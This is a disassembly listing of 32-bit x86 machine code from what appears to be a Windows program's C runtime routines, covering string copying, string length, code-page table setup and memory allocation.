  425771:	test   eax,0x81010100
  425776:	je     0x425760
  425778:	mov    eax,DWORD PTR [ecx-0x4]
  42577b:	test   al,al
  42577d:	je     0x4257a2
  42577f:	test   ah,ah
  425781:	je     0x42579d
  425783:	test   eax,0xff0000
  425788:	je     0x425798
  42578a:	test   eax,0xff000000
  42578f:	je     0x425793
  425791:	jmp    0x425760
  425793:	lea    edi,[ecx-0x1]
  425796:	jmp    0x4257a5
  425798:	lea    edi,[ecx-0x2]
  42579b:	jmp    0x4257a5
  42579d:	lea    edi,[ecx-0x3]
  4257a0:	jmp    0x4257a5
  4257a2:	lea    edi,[ecx-0x4]
  4257a5:	mov    ecx,DWORD PTR [esp+0xc]
  4257a9:	test   ecx,0x3
  4257af:	je     0x4257ce
  4257b1:	mov    dl,BYTE PTR [ecx]
  4257b3:	add    ecx,0x1
  4257b6:	test   dl,dl
  4257b8:	je     0x425820
  4257ba:	mov    BYTE PTR [edi],dl
  4257bc:	add    edi,0x1
  4257bf:	test   ecx,0x3
  4257c5:	jne    0x4257b1
  4257c7:	jmp    0x4257ce
  4257c9:	mov    DWORD PTR [edi],edx
  4257cb:	add    edi,0x4
  4257ce:	mov    edx,0x7efefeff
  4257d3:	mov    eax,DWORD PTR [ecx]
  4257d5:	add    edx,eax
  4257d7:	xor    eax,0xffffffff
  4257da:	xor    eax,edx
  4257dc:	mov    edx,DWORD PTR [ecx]
  4257de:	add    ecx,0x4
  4257e1:	test   eax,0x81010100
  4257e6:	je     0x4257c9
  4257e8:	test   dl,dl
  4257ea:	je     0x425820
  4257ec:	test   dh,dh
  4257ee:	je     0x425817
  4257f0:	test   edx,0xff0000
  4257f6:	je     0x42580a
  4257f8:	test   edx,0xff000000
  4257fe:	je     0x425802
  425800:	jmp    0x4257c9
  425802:	mov    DWORD PTR [edi],edx
  425804:	mov    eax,DWORD PTR [esp+0x8]
  425808:	pop    edi
  425809:	ret    
  42580a:	mov    WORD PTR [edi],dx
  42580d:	mov    eax,DWORD PTR [esp+0x8]
  425811:	mov    BYTE PTR [edi+0x2],0x0
  425815:	pop    edi
  425816:	ret    
  425817:	mov    WORD PTR [edi],dx
  42581a:	mov    eax,DWORD PTR [esp+0x8]
  42581e:	pop    edi
  42581f:	ret    
  425820:	mov    BYTE PTR [edi],dl
  425822:	mov    eax,DWORD PTR [esp+0x8]
  425826:	pop    edi
  425827:	ret    
  425828:	int3   
  425829:	int3   
  42582a:	int3   
  42582b:	int3   
  42582c:	int3   
  42582d:	int3   
  42582e:	int3   
  42582f:	int3   
  425830:	mov    ecx,DWORD PTR [esp+0xc]
  425834:	push   edi
  425835:	test   ecx,ecx
  425837:	je     0x4258cf
  42583d:	push   esi
  42583e:	push   ebx
  42583f:	mov    ebx,ecx
  425841:	mov    esi,DWORD PTR [esp+0x14]
  425845:	test   esi,0x3
  42584b:	mov    edi,DWORD PTR [esp+0x10]
  42584f:	jne    0x42585c
  425851:	shr    ecx,0x2
  425854:	jne    0x4258df
  42585a:	jmp    0x425883
  42585c:	mov    al,BYTE PTR [esi]
  42585e:	add    esi,0x1
  425861:	mov    BYTE PTR [edi],al
  425863:	add    edi,0x1
  425866:	sub    ecx,0x1
  425869:	je     0x425896
  42586b:	test   al,al
  42586d:	je     0x42589e
  42586f:	test   esi,0x3
  425875:	jne    0x42585c
  425877:	mov    ebx,ecx
  425879:	shr    ecx,0x2
  42587c:	jne    0x4258df
  42587e:	and    ebx,0x3
  425881:	je     0x425896
  425883:	mov    al,BYTE PTR [esi]
  425885:	add    esi,0x1
  425888:	mov    BYTE PTR [edi],al
  42588a:	add    edi,0x1
  42588d:	test   al,al
  42588f:	je     0x4258c8
  425891:	sub    ebx,0x1
  425894:	jne    0x425883
  425896:	mov    eax,DWORD PTR [esp+0x10]
  42589a:	pop    ebx
  42589b:	pop    esi
  42589c:	pop    edi
  42589d:	ret    
  42589e:	test   edi,0x3
  4258a4:	je     0x4258bc
  4258a6:	mov    BYTE PTR [edi],al
  4258a8:	add    edi,0x1
  4258ab:	sub    ecx,0x1
  4258ae:	je     0x42594c
  4258b4:	test   edi,0x3
  4258ba:	jne    0x4258a6
  4258bc:	mov    ebx,ecx
  4258be:	shr    ecx,0x2
  4258c1:	jne    0x425937
  4258c3:	mov    BYTE PTR [edi],al
  4258c5:	add    edi,0x1
  4258c8:	sub    ebx,0x1
  4258cb:	jne    0x4258c3
  4258cd:	pop    ebx
  4258ce:	pop    esi
  4258cf:	mov    eax,DWORD PTR [esp+0x8]
  4258d3:	pop    edi
  4258d4:	ret    
  4258d5:	mov    DWORD PTR [edi],edx
  4258d7:	add    edi,0x4
  4258da:	sub    ecx,0x1
  4258dd:	je     0x42587e
  4258df:	mov    edx,0x7efefeff
  4258e4:	mov    eax,DWORD PTR [esi]
  4258e6:	add    edx,eax
  4258e8:	xor    eax,0xffffffff
  4258eb:	xor    eax,edx
  4258ed:	mov    edx,DWORD PTR [esi]
  4258ef:	add    esi,0x4
  4258f2:	test   eax,0x81010100
  4258f7:	je     0x4258d5
  4258f9:	test   dl,dl
  4258fb:	je     0x425929
  4258fd:	test   dh,dh
  4258ff:	je     0x42591f
  425901:	test   edx,0xff0000
  425907:	je     0x425915
  425909:	test   edx,0xff000000
  42590f:	jne    0x4258d5
  425911:	mov    DWORD PTR [edi],edx
  425913:	jmp    0x42592d
  425915:	and    edx,0xffff
  42591b:	mov    DWORD PTR [edi],edx
  42591d:	jmp    0x42592d
  42591f:	and    edx,0xff
  425925:	mov    DWORD PTR [edi],edx
  425927:	jmp    0x42592d
  425929:	xor    edx,edx
  42592b:	mov    DWORD PTR [edi],edx
  42592d:	add    edi,0x4
  425930:	xor    eax,eax
  425932:	sub    ecx,0x1
  425935:	je     0x425943
  425937:	xor    eax,eax
  425939:	mov    DWORD PTR [edi],eax
  42593b:	add    edi,0x4
  42593e:	sub    ecx,0x1
  425941:	jne    0x425939
  425943:	and    ebx,0x3
  425946:	jne    0x4258c3
  42594c:	mov    eax,DWORD PTR [esp+0x10]
  425950:	pop    ebx
  425951:	pop    esi
  425952:	pop    edi
  425953:	ret    
  425954:	int3   
  425955:	int3   
  425956:	int3   
  425957:	int3   
  425958:	int3   
  425959:	int3   
  42595a:	int3   
  42595b:	int3   
  42595c:	int3   
  42595d:	int3   
  42595e:	int3   
  42595f:	int3   
  425960:	mov    ecx,DWORD PTR [esp+0x4]
  425964:	test   ecx,0x3
  42596a:	je     0x425990
  42596c:	mov    al,BYTE PTR [ecx]
  42596e:	add    ecx,0x1
  425971:	test   al,al
  425973:	je     0x4259c3
  425975:	test   ecx,0x3
  42597b:	jne    0x42596c
  42597d:	add    eax,0x0
  425982:	lea    esp,[esp+0x0]
  425989:	lea    esp,[esp+0x0]
  425990:	mov    eax,DWORD PTR [ecx]
  425992:	mov    edx,0x7efefeff
  425997:	add    edx,eax
  425999:	xor    eax,0xffffffff
  42599c:	xor    eax,edx
  42599e:	add    ecx,0x4
  4259a1:	test   eax,0x81010100
  4259a6:	je     0x425990
  4259a8:	mov    eax,DWORD PTR [ecx-0x4]
  4259ab:	test   al,al
  4259ad:	je     0x4259e1
  4259af:	test   ah,ah
  4259b1:	je     0x4259d7
  4259b3:	test   eax,0xff0000
  4259b8:	je     0x4259cd
  4259ba:	test   eax,0xff000000
  4259bf:	je     0x4259c3
  4259c1:	jmp    0x425990
  4259c3:	lea    eax,[ecx-0x1]
  4259c6:	mov    ecx,DWORD PTR [esp+0x4]
  4259ca:	sub    eax,ecx
  4259cc:	ret    
  4259cd:	lea    eax,[ecx-0x2]
  4259d0:	mov    ecx,DWORD PTR [esp+0x4]
  4259d4:	sub    eax,ecx
  4259d6:	ret    
  4259d7:	lea    eax,[ecx-0x3]
  4259da:	mov    ecx,DWORD PTR [esp+0x4]
  4259de:	sub    eax,ecx
  4259e0:	ret    
  4259e1:	lea    eax,[ecx-0x4]
  4259e4:	mov    ecx,DWORD PTR [esp+0x4]
  4259e8:	sub    eax,ecx
  4259ea:	ret    
  4259eb:	push   0x8
  4259ed:	push   0x429658
  4259f2:	call   0x425350
  4259f7:	and    DWORD PTR [ebp-0x4],0x0
  4259fb:	push   0x0
  4259fd:	push   0x1
  4259ff:	call   0x427572
  425a04:	pop    ecx
  425a05:	pop    ecx
  425a06:	jmp    0x425a0f
  425a08:	xor    eax,eax
  425a0a:	inc    eax
  425a0b:	ret    
  425a0c:	mov    esp,DWORD PTR [ebp-0x18]
  425a0f:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a13:	push   0x3
  425a15:	call   DWORD PTR ds:0x42905c
  425a1b:	int3   
  425a1c:	cmp    ecx,DWORD PTR ds:0x45d430
  425a22:	jne    0x425a25
  425a24:	ret    
  425a25:	jmp    0x4259eb
  425a2a:	movzx  eax,BYTE PTR [esp+0x4]
  425a2f:	mov    cl,BYTE PTR [esp+0xc]
  425a33:	test   BYTE PTR [eax+0x45df21],cl
  425a39:	jne    0x425a57
  425a3b:	cmp    DWORD PTR [esp+0x8],0x0
  425a40:	je     0x425a50
  425a42:	movzx  eax,WORD PTR [eax*2+0x429a52]
  425a4a:	and    eax,DWORD PTR [esp+0x8]
  425a4e:	jmp    0x425a52
  425a50:	xor    eax,eax
  425a52:	test   eax,eax
  425a54:	jne    0x425a57
  425a56:	ret    
  425a57:	xor    eax,eax
  425a59:	inc    eax
  425a5a:	ret    
  425a5b:	push   0x4
  425a5d:	push   0x0
  425a5f:	push   DWORD PTR [esp+0xc]
  425a63:	call   0x425a2a
  425a68:	add    esp,0xc
  425a6b:	ret    
  425a6c:	sub    eax,0x3a4
  425a71:	je     0x425a95
  425a73:	sub    eax,0x4
  425a76:	je     0x425a8f
  425a78:	sub    eax,0xd
  425a7b:	je     0x425a89
  425a7d:	dec    eax
  425a7e:	je     0x425a83
  425a80:	xor    eax,eax
  425a82:	ret    
  425a83:	mov    eax,0x404
  425a88:	ret    
  425a89:	mov    eax,0x412
  425a8e:	ret    
  425a8f:	mov    eax,0x804
  425a94:	ret    
  425a95:	mov    eax,0x411
  425a9a:	ret    
  425a9b:	push   edi
  425a9c:	push   0x40
  425a9e:	xor    eax,eax
  425aa0:	pop    ecx
  425aa1:	mov    edi,0x45df20
  425aa6:	rep stos DWORD PTR es:[edi],eax
  425aa8:	stos   BYTE PTR es:[edi],al
  425aa9:	xor    eax,eax
  425aab:	mov    ds:0x45e024,eax
  425ab0:	mov    ds:0x45df1c,eax
  425ab5:	mov    ds:0x45df14,eax
  425aba:	mov    edi,0x45e030
  425abf:	stos   DWORD PTR es:[edi],eax
  425ac0:	stos   DWORD PTR es:[edi],eax
  425ac1:	stos   DWORD PTR es:[edi],eax
  425ac2:	pop    edi
  425ac3:	ret    
  425ac4:	push   ebp
  425ac5:	mov    ebp,esp
  425ac7:	sub    esp,0x518
  425acd:	mov    eax,ds:0x45d430
  425ad2:	xor    eax,DWORD PTR [ebp+0x4]
  425ad5:	push   esi
  425ad6:	mov    DWORD PTR [ebp-0x4],eax
  425ad9:	lea    eax,[ebp-0x18]
  425adc:	push   eax
  425add:	push   DWORD PTR ds:0x45e024
  425ae3:	call   DWORD PTR ds:0x4290c8
  425ae9:	cmp    eax,0x1
  425aec:	mov    esi,0x100
  425af1:	jne    0x425c04
  425af7:	xor    eax,eax
  425af9:	mov    BYTE PTR [ebp+eax*1-0x118],al
  425b00:	inc    eax
  425b01:	cmp    eax,esi
  425b03:	jb     0x425af9
  425b05:	mov    al,BYTE PTR [ebp-0x12]
  425b08:	test   al,al
  425b0a:	mov    BYTE PTR [ebp-0x118],0x20
  425b11:	je     0x425b49
  425b13:	push   ebx
  425b14:	lea    edx,[ebp-0x11]
  425b17:	push   edi
  425b18:	movzx  ecx,BYTE PTR [edx]
  425b1b:	movzx  eax,al
  425b1e:	cmp    eax,ecx
  425b20:	ja     0x425b3f
  425b22:	sub    ecx,eax
  425b24:	inc    ecx
  425b25:	mov    ebx,ecx
  425b27:	shr    ecx,0x2
  425b2a:	lea    edi,[ebp+eax*1-0x118]
  425b31:	mov    eax,0x20202020
  425b36:	rep stos DWORD PTR es:[edi],eax
  425b38:	mov    ecx,ebx
  425b3a:	and    ecx,0x3
  425b3d:	rep stos BYTE PTR es:[edi],al
  425b3f:	inc    edx
  425b40:	mov    al,BYTE PTR [edx]
  425b42:	inc    edx
  425b43:	test   al,al
  425b45:	jne    0x425b18
  425b47:	pop    edi
  425b48:	pop    ebx
  425b49:	push   0x0
  425b4b:	push   DWORD PTR ds:0x45df14
  425b51:	lea    eax,[ebp-0x518]
  425b57:	push   DWORD PTR ds:0x45e024
  425b5d:	push   eax
  425b5e:	push   esi
  425b5f:	lea    eax,[ebp-0x118]
  425b65:	push   eax
  425b66:	push   0x1
  425b68:	call   0x427a78
  425b6d:	push   0x0
  425b6f:	push   DWORD PTR ds:0x45e024
  425b75:	lea    eax,[ebp-0x218]
  425b7b:	push   esi
  425b7c:	push   eax
  425b7d:	push   esi
  425b7e:	lea    eax,[ebp-0x118]
  425b84:	push   eax
  425b85:	push   esi
  425b86:	push   DWORD PTR ds:0x45df14
  425b8c:	call   0x4276bc
  425b91:	push   0x0
  425b93:	push   DWORD PTR ds:0x45e024
  425b99:	lea    eax,[ebp-0x318]
  425b9f:	push   esi
  425ba0:	push   eax
  425ba1:	push   esi
  425ba2:	lea    eax,[ebp-0x118]
  425ba8:	push   eax
  425ba9:	push   0x200
  425bae:	push   DWORD PTR ds:0x45df14
  425bb4:	call   0x4276bc
  425bb9:	add    esp,0x5c
  425bbc:	xor    eax,eax
  425bbe:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  425bc6:	test   cl,0x1
  425bc9:	je     0x425be1
  425bcb:	or     BYTE PTR [eax+0x45df21],0x10
  425bd2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  425bd9:	mov    BYTE PTR [eax+0x45e040],cl
  425bdf:	jmp    0x425bfd
  425be1:	test   cl,0x2
  425be4:	je     0x425bf6
  425be6:	or     BYTE PTR [eax+0x45df21],0x20
  425bed:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  425bf4:	jmp    0x425bd9
  425bf6:	and    BYTE PTR [eax+0x45e040],0x0
  425bfd:	inc    eax
  425bfe:	cmp    eax,esi
  425c00:	jb     0x425bbe
  425c02:	jmp    0x425c48
  425c04:	xor    eax,eax
  425c06:	cmp    eax,0x41
  425c09:	jb     0x425c24
  425c0b:	cmp    eax,0x5a
  425c0e:	ja     0x425c24
  425c10:	or     BYTE PTR [eax+0x45df21],0x10
  425c17:	mov    cl,al
  425c19:	add    cl,0x20
  425c1c:	mov    BYTE PTR [eax+0x45e040],cl
  425c22:	jmp    0x425c43
  425c24:	cmp    eax,0x61
  425c27:	jb     0x425c3c
  425c29:	cmp    eax,0x7a
  425c2c:	ja     0x425c3c
  425c2e:	or     BYTE PTR [eax+0x45df21],0x20
  425c35:	mov    cl,al
  425c37:	sub    cl,0x20
  425c3a:	jmp    0x425c1c
  425c3c:	and    BYTE PTR [eax+0x45e040],0x0
  425c43:	inc    eax
  425c44:	cmp    eax,esi
  425c46:	jb     0x425c06
  425c48:	mov    ecx,DWORD PTR [ebp-0x4]
  425c4b:	xor    ecx,DWORD PTR [ebp+0x4]
  425c4e:	pop    esi
  425c4f:	call   0x425a1c
  425c54:	leave  
  425c55:	ret    
  425c56:	push   ebp
  425c57:	mov    ebp,esp
  425c59:	sub    esp,0x1c
  425c5c:	mov    eax,ds:0x45d430
  425c61:	xor    eax,DWORD PTR [ebp+0x4]
  425c64:	push   ebx
  425c65:	push   esi
  425c66:	mov    esi,DWORD PTR [ebp+0x8]
  425c69:	xor    ebx,ebx
  425c6b:	cmp    esi,ebx
  425c6d:	mov    DWORD PTR [ebp-0x4],eax
  425c70:	push   edi
  425c71:	je     0x425dcb
  425c77:	xor    edx,edx
  425c79:	xor    eax,eax
  425c7b:	cmp    DWORD PTR [eax+0x45d440],esi
  425c81:	je     0x425ce8
  425c83:	add    eax,0x30
  425c86:	inc    edx
  425c87:	cmp    eax,0xf0
  425c8c:	jb     0x425c7b
  425c8e:	lea    eax,[ebp-0x1c]
  425c91:	push   eax
  425c92:	push   esi
  425c93:	call   DWORD PTR ds:0x4290c8
  425c99:	cmp    eax,0x1
  425c9c:	jne    0x425dc3
  425ca2:	push   0x40
  425ca4:	xor    eax,eax
  425ca6:	cmp    DWORD PTR [ebp-0x1c],0x1
  425caa:	pop    ecx
  425cab:	mov    edi,0x45df20
  425cb0:	rep stos DWORD PTR es:[edi],eax
  425cb2:	stos   BYTE PTR es:[edi],al
  425cb3:	mov    DWORD PTR ds:0x45e024,esi
  425cb9:	mov    DWORD PTR ds:0x45df14,ebx
  425cbf:	jbe    0x425db1
  425cc5:	cmp    BYTE PTR [ebp-0x16],0x0
  425cc9:	je     0x425d89
  425ccf:	lea    ecx,[ebp-0x15]
  425cd2:	mov    dl,BYTE PTR [ecx]
  425cd4:	test   dl,dl
  425cd6:	je     0x425d89
  425cdc:	movzx  eax,BYTE PTR [ecx-0x1]
  425ce0:	movzx  edx,dl
  425ce3:	jmp    0x425d79
  425ce8:	push   0x40
  425cea:	xor    eax,eax
  425cec:	pop    ecx
  425ced:	mov    edi,0x45df20
  425cf2:	rep stos DWORD PTR es:[edi],eax
  425cf4:	lea    ecx,[edx+edx*2]
  425cf7:	shl    ecx,0x4
  425cfa:	mov    DWORD PTR [ebp-0x8],ebx
  425cfd:	stos   BYTE PTR es:[edi],al
  425cfe:	lea    ebx,[ecx+0x45d450]
  425d04:	mov    al,BYTE PTR [ebx]
  425d06:	mov    esi,ebx
  425d08:	jmp    0x425d33
  425d0a:	mov    dl,BYTE PTR [esi+0x1]
  425d0d:	test   dl,dl
  425d0f:	je     0x425d37
  425d11:	movzx  eax,al
  425d14:	movzx  edi,dl
  425d17:	cmp    eax,edi
  425d19:	ja     0x425d2f
  425d1b:	mov    edx,DWORD PTR [ebp-0x8]
  425d1e:	mov    dl,BYTE PTR [edx+0x45d438]
  425d24:	or     BYTE PTR [eax+0x45df21],dl
  425d2a:	inc    eax
  425d2b:	cmp    eax,edi
  425d2d:	jbe    0x425d24
  425d2f:	inc    esi
  425d30:	inc    esi
  425d31:	mov    al,BYTE PTR [esi]
  425d33:	test   al,al
  425d35:	jne    0x425d0a
  425d37:	inc    DWORD PTR [ebp-0x8]
  425d3a:	add    ebx,0x8
  425d3d:	cmp    DWORD PTR [ebp-0x8],0x4
  425d41:	jb     0x425d04
  425d43:	mov    eax,DWORD PTR [ebp+0x8]
  425d46:	mov    ds:0x45e024,eax
  425d4b:	mov    DWORD PTR ds:0x45df1c,0x1
  425d55:	call   0x425a6c
  425d5a:	lea    ecx,[ecx+0x45d444]
  425d60:	mov    esi,ecx
  425d62:	mov    edi,0x45e030
  425d67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d69:	mov    ds:0x45df14,eax
  425d6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d6f:	jmp    0x425dd0
  425d71:	or     BYTE PTR [eax+0x45df21],0x4
  425d78:	inc    eax
  425d79:	cmp    eax,edx
  425d7b:	jbe    0x425d71
  425d7d:	inc    ecx
  425d7e:	inc    ecx
  425d7f:	cmp    BYTE PTR [ecx-0x1],0x0
  425d83:	jne    0x425cd2
  425d89:	xor    ecx,ecx
  425d8b:	inc    ecx
  425d8c:	mov    eax,ecx
  425d8e:	or     BYTE PTR [eax+0x45df21],0x8
  425d95:	inc    eax
  425d96:	cmp    eax,0xff
  425d9b:	jb     0x425d8e
  425d9d:	mov    eax,esi
  425d9f:	call   0x425a6c
  425da4:	mov    ds:0x45df14,eax
  425da9:	mov    DWORD PTR ds:0x45df1c,ecx
  425daf:	jmp    0x425db7
  425db1:	mov    DWORD PTR ds:0x45df1c,ebx
  425db7:	xor    eax,eax
  425db9:	mov    edi,0x45e030
  425dbe:	stos   DWORD PTR es:[edi],eax
  425dbf:	stos   DWORD PTR es:[edi],eax
  425dc0:	stos   DWORD PTR es:[edi],eax
  425dc1:	jmp    0x425dd0
  425dc3:	cmp    DWORD PTR ds:0x45dd84,ebx
  425dc9:	je     0x425dd9
  425dcb:	call   0x425a9b
  425dd0:	call   0x425ac4
  425dd5:	xor    eax,eax
  425dd7:	jmp    0x425ddc
  425dd9:	or     eax,0xffffffff
  425ddc:	mov    ecx,DWORD PTR [ebp-0x4]
  425ddf:	xor    ecx,DWORD PTR [ebp+0x4]
  425de2:	pop    edi
  425de3:	pop    esi
  425de4:	pop    ebx
  425de5:	call   0x425a1c
  425dea:	leave  
  425deb:	ret    
  425dec:	push   0x14
  425dee:	push   0x429668
  425df3:	call   0x425350
  425df8:	or     DWORD PTR [ebp-0x1c],0xffffffff
  425dfc:	push   0xd
  425dfe:	call   0x42550f
  425e03:	pop    ecx
  425e04:	xor    edi,edi
  425e06:	mov    DWORD PTR [ebp-0x4],edi
  425e09:	mov    DWORD PTR ds:0x45dd84,edi
  425e0f:	mov    eax,DWORD PTR [ebp+0x8]
  425e12:	cmp    eax,0xfffffffe
  425e15:	jne    0x425e29
  425e17:	mov    DWORD PTR ds:0x45dd84,0x1
  425e21:	call   DWORD PTR ds:0x4290c4
  425e27:	jmp    0x425e54
  425e29:	cmp    eax,0xfffffffd
  425e2c:	jne    0x425e40
  425e2e:	mov    DWORD PTR ds:0x45dd84,0x1
  425e38:	call   DWORD PTR ds:0x4290c0
  425e3e:	jmp    0x425e54
  425e40:	cmp    eax,0xfffffffc
  425e43:	jne    0x425e54
  425e45:	mov    DWORD PTR ds:0x45dd84,0x1
  425e4f:	mov    eax,ds:0x45ddb4
  425e54:	mov    DWORD PTR [ebp+0x8],eax
  425e57:	cmp    eax,DWORD PTR ds:0x45e024
  425e5d:	je     0x425f1e
  425e63:	mov    esi,DWORD PTR ds:0x45df18
  425e69:	mov    DWORD PTR [ebp-0x20],esi
  425e6c:	cmp    esi,edi
  425e6e:	je     0x425e74
  425e70:	cmp    DWORD PTR [esi],edi
  425e72:	je     0x425e84
  425e74:	push   0x220
  425e79:	call   0x426072
  425e7e:	pop    ecx
  425e7f:	mov    esi,eax
  425e81:	mov    DWORD PTR [ebp-0x20],esi
  425e84:	cmp    esi,edi
  425e86:	je     0x425f07
  425e88:	push   DWORD PTR [ebp+0x8]
  425e8b:	call   0x425c56
  425e90:	pop    ecx
  425e91:	mov    DWORD PTR [ebp-0x1c],eax
  425e94:	cmp    eax,edi
  425e96:	jne    0x425f07
  425e98:	mov    DWORD PTR [esi],edi
  425e9a:	mov    eax,ds:0x45e024
  425e9f:	mov    DWORD PTR [esi+0x4],eax
  425ea2:	mov    eax,ds:0x45df1c
  425ea7:	mov    DWORD PTR [esi+0x8],eax
  425eaa:	mov    eax,ds:0x45df14
  425eaf:	mov    DWORD PTR [esi+0xc],eax
  425eb2:	xor    eax,eax
  425eb4:	mov    DWORD PTR [ebp-0x24],eax
  425eb7:	cmp    eax,0x5
  425eba:	jge    0x425ecc
  425ebc:	mov    cx,WORD PTR [eax*2+0x45e030]
  425ec4:	mov    WORD PTR [esi+eax*2+0x10],cx
  425ec9:	inc    eax
  425eca:	jmp    0x425eb4
  425ecc:	xor    eax,eax
  425ece:	mov    DWORD PTR [ebp-0x24],eax
  425ed1:	cmp    eax,0x101
  425ed6:	jge    0x425ee5
  425ed8:	mov    cl,BYTE PTR [eax+0x45df20]
  425ede:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  425ee2:	inc    eax
  425ee3:	jmp    0x425ece
  425ee5:	xor    eax,eax
  425ee7:	mov    DWORD PTR [ebp-0x24],eax
  425eea:	cmp    eax,0x100
  425eef:	jge    0x425f01
  425ef1:	mov    cl,BYTE PTR [eax+0x45e040]
  425ef7:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  425efe:	inc    eax
  425eff:	jmp    0x425ee7
  425f01:	mov    DWORD PTR ds:0x45df18,esi
  425f07:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  425f0b:	jne    0x425f21
  425f0d:	cmp    esi,DWORD PTR ds:0x45df18
  425f13:	je     0x425f21
  425f15:	push   esi
  425f16:	call   0x425f5a
  425f1b:	pop    ecx
  425f1c:	jmp    0x425f21
  425f1e:	mov    DWORD PTR [ebp-0x1c],edi
  425f21:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f25:	call   0x425f33
  425f2a:	mov    eax,DWORD PTR [ebp-0x1c]
  425f2d:	call   0x42538b
  425f32:	ret    
  425f33:	push   0xd
  425f35:	call   0x42547b
  425f3a:	pop    ecx
  425f3b:	ret    
  425f3c:	cmp    DWORD PTR ds:0x45e26c,0x0
  425f43:	jne    0x425f57
  425f45:	push   0xfffffffd
  425f47:	call   0x425dec
  425f4c:	pop    ecx
  425f4d:	mov    DWORD PTR ds:0x45e26c,0x1
  425f57:	xor    eax,eax
  425f59:	ret    
  425f5a:	push   0xc
  425f5c:	push   0x429678
  425f61:	call   0x425350
  425f66:	mov    esi,DWORD PTR [ebp+0x8]
  425f69:	test   esi,esi
  425f6b:	je     0x425fc5
  425f6d:	cmp    DWORD PTR ds:0x45e144,0x3
  425f74:	jne    0x425fb6
  425f76:	push   0x4
  425f78:	call   0x42550f
  425f7d:	pop    ecx
  425f7e:	and    DWORD PTR [ebp-0x4],0x0
  425f82:	push   esi
  425f83:	call   0x426732
  425f88:	pop    ecx
  425f89:	mov    DWORD PTR [ebp-0x1c],eax
  425f8c:	test   eax,eax
  425f8e:	je     0x425f99
  425f90:	push   esi
  425f91:	push   eax
  425f92:	call   0x42675d
  425f97:	pop    ecx
  425f98:	pop    ecx
  425f99:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f9d:	call   0x425fad
  425fa2:	cmp    DWORD PTR [ebp-0x1c],0x0
  425fa6:	jne    0x425fc5
  425fa8:	push   DWORD PTR [ebp+0x8]
  425fab:	jmp    0x425fb7
  425fad:	push   0x4
  425faf:	call   0x42547b
  425fb4:	pop    ecx
  425fb5:	ret    
  425fb6:	push   esi
  425fb7:	push   0x0
  425fb9:	push   DWORD PTR ds:0x45e140
  425fbf:	call   DWORD PTR ds:0x429048
  425fc5:	call   0x42538b
  425fca:	ret    
  425fcb:	push   0xc
  425fcd:	push   0x429688
  425fd2:	call   0x425350
  425fd7:	mov    esi,DWORD PTR [ebp+0x8]
  425fda:	cmp    DWORD PTR ds:0x45e144,0x3
  425fe1:	jne    0x426011
  425fe3:	cmp    esi,DWORD PTR ds:0x45df04
  425fe9:	ja     0x426011
  425feb:	push   0x4
  425fed:	call   0x42550f
  425ff2:	pop    ecx
  425ff3:	and    DWORD PTR [ebp-0x4],0x0
  425ff7:	push   esi
  425ff8:	call   0x426f11
  425ffd:	pop    ecx
  425ffe:	mov    DWORD PTR [ebp-0x1c],eax
  426001:	or     DWORD PTR [ebp-0x4],0xffffffff
  426005:	call   0x42603d
  42600a:	mov    eax,DWORD PTR [ebp-0x1c]
  42600d:	test   eax,eax
  42600f:	jne    0x426034
  426011:	test   esi,esi
  426013:	jne    0x426016
  426015:	inc    esi
  426016:	cmp    DWORD PTR ds:0x45e144,0x1
  42601d:	je     0x426025
  42601f:	add    esi,0xf
  426022:	and    esi,0xfffffff0
  426025:	push   esi
  426026:	push   0x0
  426028:	push   DWORD PTR ds:0x45e140
  42602e:	call   DWORD PTR ds:0x429030
  426034:	call   0x42538b
  426039:	ret    
  42603a:	mov    esi,DWORD PTR [ebp+0x8]
  42603d:	push   0x4
  42603f:	call   0x42547b
  426044:	pop    ecx
  426045:	ret    
  426046:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42604b:	ja     0x42606f
  42604d:	push   DWORD PTR [esp+0x4]
  426051:	call   0x425fcb
  426056:	test   eax,eax
  426058:	pop    ecx
  426059:	jne    0x426071
  42605b:	cmp    DWORD PTR [esp+0x8],eax
  42605f:	je     0x426071
  426061:	push   DWORD PTR [esp+0x4]
  426065:	call   0x427c32
  42606a:	test   eax,eax
  42606c:	pop    ecx
  42606d:	jne    0x42604d
  42606f:	xor    eax,eax
  426071:	ret    
  426072:	push   DWORD PTR ds:0x45ddc8
  426078:	push   DWORD PTR [esp+0x8]
  42607c:	call   0x426046
  426081:	pop    ecx
  426082:	pop    ecx
  426083:	ret    
  426084:	int3   
  426085:	int3   
  426086:	int3   
  426087:	int3   
  426088:	int3   
  426089:	int3   
  42608a:	int3   
  42608b:	int3   
  42608c:	int3   
  42608d:	int3   
  42608e:	int3   
  42608f:	int3   
  426090:	push   ebp
  426091:	mov    ebp,esp
  426093:	push   edi
  426094:	push   esi
  426095:	mov    esi,DWORD PTR [ebp+0xc]
  426098:	mov    ecx,DWORD PTR [ebp+0x10]
  42609b:	mov    edi,DWORD PTR [ebp+0x8]
  42609e:	mov    eax,ecx
  4260a0:	mov    edx,ecx
  4260a2:	add    eax,esi
  4260a4:	cmp    edi,esi
  4260a6:	jbe    0x4260b0
  4260a8:	cmp    edi,eax
  4260aa:	jb     0x42622c
  4260b0:	test   edi,0x3
  4260b6:	jne    0x4260cc
  4260b8:	shr    ecx,0x2
  4260bb:	and    edx,0x3
  4260be:	cmp    ecx,0x8
  4260c1:	jb     0x4260ec
  4260c3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260c5:	jmp    DWORD PTR [edx*4+0x4261dc]
  4260cc:	mov    eax,edi
  4260ce:	mov    edx,0x3
  4260d3:	sub    ecx,0x4
  4260d6:	jb     0x4260e4
  4260d8:	and    eax,0x3
  4260db:	add    ecx,eax
  4260dd:	jmp    DWORD PTR [eax*4+0x4260f0]
  4260e4:	jmp    DWORD PTR [ecx*4+0x4261ec]
  4260eb:	nop
  4260ec:	jmp    DWORD PTR [ecx*4+0x426170]
  4260f3:	nop
